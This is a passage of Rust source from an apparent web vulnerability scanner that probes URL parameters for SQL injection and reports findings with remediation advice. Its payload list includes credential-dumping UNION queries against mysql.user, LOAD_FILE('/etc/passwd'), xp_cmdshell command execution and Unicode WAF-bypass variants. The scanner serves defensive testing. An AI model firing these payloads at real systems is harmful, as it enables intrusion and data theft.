            return true;
        }
    }
    false
}

/// Checks if boolean-based blind SQLi indicators appear (length or content difference).
fn check_boolean_indicators(hit_body: &str, miss_body: &str) -> bool {
    hit_body.len() != miss_body.len()
        || hit_body.contains("GRYM_BOOL_TEST_TRUE")
        || !miss_body.contains("GRYM_BOOL_TEST_TRUE")
}

pub async fn check_sqli(
    client: &ScopedClient,
    url: &Url,
) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();

    let base_query = get_all_params(url);

    if base_query.is_empty() {
        return Ok(findings);
    }

    for (param_name, _original_value) in &base_query {
        let mut param_findings = Vec::new();

        // Phase 1: Basic error-based detection
        for payload in [
            SQLI_PAYLOADS,
            URL_ENCODED_SQLI,
            HTML_ENTITY_SQLI,
            WAF_BYPASS_SQLI,
            MULTI_STAGE_SQLI,
        ]
        .concat()
        {
            let test_url = inject_payload(url, &base_query, param_name, payload);

            if let Ok(response) = client
                .get(
                    "grym-web-scanner",
                    test_url,
                    TechniqueTier::StandardDetection,
                )
                .await
                && let Some(finding) = check_sql_error(&response.body, payload, param_name, url)
            {
                let mut f = finding;
                f.categories.push("A05:2025-Injection".into());
                f.cwe_ids.push(89);
                f.evidence.push(Evidence::redacted(
                    "sqli-error-based",
                    format!("SQL error pattern matched with payload: {}", payload),
                    response.body.chars().take(200).collect::<String>(),
                ));
                f.remediation = "Use parameterized queries or prepared statements with proper input validation and escaping.".into();
                f.references
                    .push("https://owasp.org/www-community/attacks/SQL_Injection".into());
                param_findings.push(f);
                break;
            }
        }

        // Phase 2: Boolean-based blind detection
        if param_findings.is_empty() {
            for (true_payload, false_payload) in BOOLEAN_BLIND_PAYLOADS {
                let true_url = inject_payload(url, &base_query, param_name, true_payload);
                let false_url = inject_payload(url, &base_query, param_name, false_payload);

                let true_response = client
                    .get(
                        "grym-web-scanner",
                        true_url,
                        TechniqueTier::StandardDetection,
                    )
                    .await
                    .ok();
                let false_response = client
                    .get(
                        "grym-web-scanner",
                        false_url,
                        TechniqueTier::StandardDetection,
                    )
                    .await
                    .ok();

                if let (Some(tr), Some(fr)) = (true_response, false_response)
                    && check_boolean_indicators(&tr.body, &fr.body)
                {
                    let mut f = Finding::new(
                        format!(
                            "Boolean-based SQL Injection detected in parameter '{}'",
                            param_name
                        ),
                        AssetRef {
                            identifier: url.to_string(),
                            kind: "web".into(),
                        },
                        Severity::Critical,
                        Confidence::Likely,
                        "grym-web-scanner",
                    );
                    f.categories.push("A05:2025-Injection".into());
                    f.cwe_ids.push(89);
                    f.evidence.push(Evidence::redacted(
                        "sqli-boolean",
                        format!(
                            "Boolean blind: '{}' vs '{}' produced different responses",
                            true_payload, false_payload
                        ),
                        tr.body.chars().take(200).collect::<String>(),
                    ));
                    f.remediation = "Use parameterized queries. Implement proper access controls and input validation.".into();
                    f.references
                        .push("https://owasp.org/www-community/attacks/SQL_Injection".into());
                    param_findings.push(f);
                    break;
                }
            }
        }

        // Phase 3: Time-based blind detection
        if param_findings.is_empty() {
            for payload in TIME_BLIND_PAYLOADS {
                let test_url = inject_payload(url, &base_query, param_name, payload);
                let start = std::time::Instant::now();
                let response = client
                    .get(
                        "grym-web-scanner",
                        test_url,
                        TechniqueTier::StandardDetection,
                    )
                    .await
                    .ok();
                let elapsed = start.elapsed().as_millis();

                if let Some(_r) = response
                    && elapsed > 2500
                {
                    let mut f = Finding::new(
                        format!(
                            "Time-based SQL Injection detected in parameter '{}'",
                            param_name
                        ),
                        AssetRef {
                            identifier: url.to_string(),
                            kind: "web".into(),
                        },
                        Severity::Critical,
                        Confidence::Confirmed,
                        "grym-web-scanner",
                    );
                    f.categories.push("A05:2025-Injection".into());
                    f.cwe_ids.push(89);
                    f.evidence.push(Evidence::redacted(
                        "sqli-time",
                        format!("Time-based blind SQLi: payload took {}ms", elapsed),
                        format!("Payload: {}, Response time: {}ms", payload, elapsed),
                    ));
                    f.remediation = "Use parameterized queries with proper timeout handling and input validation.".into();
                    f.references
                        .push("https://owasp.org/www-community/attacks/Blind_SQL_Injection".into());
                    param_findings.push(f);
                    break;
                }
            }
        }

        // Phase 4: Union-based detection
        if param_findings.is_empty() {
            for payload in UNION_PAYLOADS {
                let test_url = inject_payload(url, &base_query, param_name, payload);

                if let Ok(response) = client
                    .get(
                        "grym-web-scanner",
                        test_url,
                        TechniqueTier::StandardDetection,
                    )
                    .await
                {
                    // Check for successful UNION (200 instead of 500, different content length)
                    if response.status == 200 {
                        let is_valid_union = !response.body.contains("SQL syntax")
                            && !response.body.contains("warning")
                            && response.body.len() > 20;

                        if is_valid_union && response.body.starts_with("<") {
                            let has_content_variation =
                                !response.body.contains("&lt;") && response.body.len() > 100;
                            if has_content_variation {
                                let mut f = Finding::new(
                                    format!(
                                        "UNION-based SQL Injection detected in parameter '{}'",
                                        param_name
                                    ),
                                    AssetRef {
                                        identifier: url.to_string(),
                                        kind: "web".into(),
                                    },
                                    Severity::Critical,
                                    Confidence::Confirmed,
                                    "grym-web-scanner",
                                );
                                f.categories.push("A05:2025-Injection".into());
                                f.cwe_ids.push(89);
                                f.evidence.push(Evidence::redacted(
                                    "sqli-union",
                                    format!("UNION-based SQLi payload: {}", payload),
                                    response.body.chars().take(200).collect::<String>(),
                                ));
                                f.remediation = "Use parameterized queries. Restrict database user permissions to minimize UNION-based data extraction.".into();
                                f.references.push(
                                    "https://owasp.org/www-community/attacks/SQL_Injection".into(),
                                );
                                param_findings.push(f);
                                break;
                            }
                        }
                    }
                }
            }
        }

        // Phase 5: Stacked query detection
        if param_findings.is_empty() {
            for payload in STACKED_QUERY_PAYLOADS {
                let test_url = inject_payload(url, &base_query, param_name, payload);

                if let Ok(response) = client
                    .get(
                        "grym-web-scanner",
                        test_url,
                        TechniqueTier::StandardDetection,
                    )
                    .await
                {
                    let is_success =
                        response.status == 200 || response.body.contains("GRYM_STACKED_TEST");
                    if is_success {
                        let mut f = Finding::new(
                            format!(
                                "Stacked query SQL Injection detected in parameter '{}'",
                                param_name
                            ),
                            AssetRef {
                                identifier: url.to_string(),
                                kind: "web".into(),
                            },
                            Severity::Critical,
                            Confidence::Confirmed,
                            "grym-web-scanner",
                        );
                        f.categories.push("A05:2025-Injection".into());
                        f.cwe_ids.push(89);
                        f.evidence.push(Evidence::redacted(
                            "sqli-stacked",
                            format!("Stacked query payload: {}", payload),
                            response.body.chars().take(200).collect::<String>(),
                        ));
                        f.remediation = "Avoid stacked queries in database APIs. Use parameterized queries with single-statement execution.".into();
                        f.references
                            .push("https://owasp.org/www-community/attacks/SQL_Injection".into());
                        param_findings.push(f);
                        break;
                    }
                }
            }
        }

        findings.extend(param_findings);
    }

    Ok(findings)
}

/// Legacy payload list for compatibility and backward-compatible scanning (~120).
const SQLI_PAYLOADS: &[&str] = &[
    "'",
    "\"",
    "')",
    "'--",
    "'-- -",
    "'#",
    "';--",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    " OR 1=1--",
    " OR '1'='1'",
    "admin'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1 AND 1=1",
    "1 AND 1=2",
    "1 OR 1=1",
    "1 OR 1=2",
    "admin' OR '1'='1",
    "admin'--",
    "admin'/*",
    "') OR ('1'='1",
    "' OR 1=1",
    "\" OR 1=1",
    "'/**/OR/**/1=1",
    "\"/**/OR/**/1=1",
    "1",
    "1'",
    "1\"",
    "1'--",
    "1'#",
    "1';--",
    "1' OR 1=1--",
    "1' OR 1=2--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1\" OR 1=1--",
    "1\" AND 1=1--",
    "1') OR ('1'='1",
    "1')) OR (('1'='1",
    "1' OR '1'='1'--",
    "1' OR '1'='1'#",
    "1' AND '1'='1'--",
    "1' AND '1'='1'#",
    "1' AND '1'='2'--",
    "1' OR 'a'='a",
    "1' OR 'a'='b",
    "1' AND 'a'='a",
    "1' AND 'a'='b",
    "' OR 'a'='a'--",
    "' OR 'a'='b'--",
    "' AND 'a'='a'--",
    "' AND 'a'='b'--",
    "' OR 1=1-- -",
    "1' OR 1=1-- -",
    "' OR 1=1#",
    "1' OR 1=1#",
    "' OR 1=1 LIMIT 1--",
    "1' OR 1=1 LIMIT 1--",
    "' OR 1=1 GROUP BY 1--",
    "1' OR 1=1 GROUP BY 1--",
    "' OR 1=1 HAVING 1=1--",
    "1' OR 1=1 HAVING 1=1--",
    "' OR 1=1 ORDER BY 1--",
    "1' OR 1=1 ORDER BY 1--",
    "' OR 1=1 UNION SELECT NULL--",
    "1' OR 1=1 UNION SELECT NULL--",
    "' OR 1=1 UNION ALL SELECT NULL--",
    "1' OR 1=1 UNION ALL SELECT NULL--",
    "' OR 1=1 UNION SELECT 1,2--",
    "1' OR 1=1 UNION SELECT 1,2--",
    "' OR 1=1 UNION SELECT NULL,NULL,NULL--",
    "1' OR 1=1 UNION SELECT NULL,NULL,NULL--",
    "' OR 1=1 UNION ALL SELECT NULL,NULL,NULL--",
    "1' OR 1=1 UNION ALL SELECT NULL,NULL,NULL--",
    "' OR 1=1 UNION SELECT @@version--",
    "' OR 1=1 UNION SELECT user(),database()--",
    "' OR 1=1 UNION SELECT @@datadir--",
    "' OR 1=1 UNION SELECT LOAD_FILE('/etc/passwd')--",
    "' OR 1=1 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--",
    "' OR 1=1 UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns--",
    "1' OR 1=1 UNION SELECT GROUP_CONCAT(user,0x3a,password) FROM mysql.user--",
    "1' OR 1=1 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--",
    "' OR 1=1; --",
    "1' OR 1=1; --",
    "'; SELECT 1; --",
    "1'; SELECT 1; --",
    "'; SELECT SLEEP(5); --",
    "'; WAITFOR DELAY '0:0:5'; --",
    "'; SELECT pg_sleep(5); --",
    "' OR SLEEP(5); --",
    "' OR pg_sleep(5); --",
    "' OR dbms_pipe.receive_message(('a'),5); --",
    "'; EXEC master..xp_cmdshell 'whoami'; --",
    "' AND SLEEP(5); --",
    "1 AND SLEEP(5); --",
    "1 AND (SELECT SLEEP(5)); --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))x); --",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))x); --",
    "' AND BENCHMARK(5000000,SHA1('x')); --",
    "1 AND BENCHMARK(5000000,SHA1('x')); --",
    "'\u{00a0}OR\u{00a0}1=1--",
    "'\u{00a0}AND\u{00a0}1=1--",
    "'\u{00a0}AND\u{00a0}1=2--",
    "1'\u{00a0}OR\u{00a0}1=1--",
    "1'\u{00a0}OR\u{00a0}1=2--",
    "'\u{3000}OR\u{3000}1=1--",
    "'\u{3000}OR\u{3000}1=2--",
    "'\u{200b}OR\u{200b}1=1--",
    "'\u{200b}AND\u{200b}1=1--",
    "'\u{200b}AND\u{200b}1=2--",
    "1'\u{200b}OR\u{200b}1=1--",
    "1'\u{200b}OR\u{200b}1=2--",
    "'\u{180e}OR\u{180e}1=1--",
    "'\u{180e}OR\u{180e}1=2--",
    "'/**/OR/**/1=1--",
    "'/**/AND/**/1=1--",
    "'/**/AND/**/1=2--",
    "1'/**/OR/**/1=1--",
    "1'/**/AND/**/1=1--",
    "1'/**/AND/**/1=2--",
    "'/*!50000OR*/1=1--",
    "1'/*!50000OR*/1=1--",
    "' OR\u{2215}1=1--",
    "1' OR\u{2215}1=1--",
    "' UNI\u{2044}ON SELECT NULL--",
    "1' UNI\u{2044}ON SELECT NULL--",
    "SELЕСT 1",
    "SЕLЕСT * FROM users",
    "UNIОN SЕLЕСT NULL",
    "SLEEP\u{ff08}5\u{ff09}",
    "1\u{ff07} OR 1=1--",
];
